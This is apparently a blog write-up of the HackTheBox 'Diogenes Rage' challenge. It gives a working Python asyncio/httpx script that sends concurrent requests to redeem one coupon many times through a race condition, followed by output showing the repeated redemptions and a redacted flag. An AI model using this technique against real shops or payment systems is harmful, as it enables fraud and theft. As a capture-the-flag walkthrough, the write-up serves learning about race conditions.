---
title: HackTheBox - Diogenes Rage
author: 0
date: 2023-03-30 16:00:00 +0800
categories: [htb, challenges]
tags: [race condition]
render_with_liquid: false
---

This challenge allows us to apply one coupon. With a race condition we can exploit this so that we can redeem multiple coupons at the same time before the application can register that it has already been applied.

This can be done in bash, but I used `asyncio` and `httpx` and a python script to get the flag. `asyncio` allows you to write asynchronous code that can run concurrently without blocking the event loop. 

**exploit.py**
```python
import httpx
import asyncio
import sys

url = f"http://{sys.argv[1]}/api/"
api_coupon = "coupons/apply"
api_purchase = "purchase"
item = '{"item":"C8"}'
coupon = '{"coupon_code":"HTB_100"}'

async def apply_coupon(session):
    async with httpx.AsyncClient() as client:
        response = await client.post(url + api_coupon , json={"coupon_code":"HTB_100"}, cookies=session)
        print(response.text)
        session.update(response.cookies)

async def main():
    async with httpx.AsyncClient() as client:
        # reset session
        response = await client.get(url + 'reset')

        # perform purchase to get session
        response = await client.post(url + api_purchase, json={"item":"C8"})
        session = response.cookies
        print(response.text)
        print(session)

        # perform race condition
        tasks = []
        for i in range(1, 20):
            tasks.append(asyncio.ensure_future(apply_coupon(session)))
        print("starting requests")
        await asyncio.gather(*tasks)
        print("requests completed")

        # perform purchase again
        response = await client.post(url + api_purchase, json={"item":"C8"}, cookies=session)
        print(response.text)

asyncio.run(main())
```

**output**
```
└─$ python exploit3.py IP:PORT
{"message":"Insufficient balance!"}
starting requests
{"message":"$1 coupon redeemed successfully! Please select an item for order."}
{"message":"This coupon is already redeemed!"}
{"message":"$1 coupon redeemed successfully! Please select an item for order."}
{"message":"$1 coupon redeemed successfully! Please select an item for order."}
{"message":"$1 coupon redeemed successfully! Please select an item for order."}
{"message":"$1 coupon redeemed successfully! Please select an item for order."}
{"message":"$1 coupon redeemed successfully! Please select an item for order."}
{"message":"$1 coupon redeemed successfully! Please select an item for order."}
{"message":"$1 coupon redeemed successfully! Please select an item for order."}
{"message":"$1 coupon redeemed successfully! Please select an item for order."}
{"message":"$1 coupon redeemed successfully! Please select an item for order."}
{"message":"$1 coupon redeemed successfully! Please select an item for order."}
{"message":"$1 coupon redeemed successfully! Please select an item for order."}
{"message":"$1 coupon redeemed successfully! Please select an item for order."}
{"message":"$1 coupon redeemed successfully! Please select an item for order."}
{"message":"$1 coupon redeemed successfully! Please select an item for order."}
{"message":"$1 coupon redeemed successfully! Please select an item for order."}
{"message":"$1 coupon redeemed successfully! Please select an item for order."}
{"message":"$1 coupon redeemed successfully! Please select an item for order."}
requests completed
{"flag":"HTB{**REDACTED**}","message":"Thank you for your order! $4.63 coupon credits left!"}
```
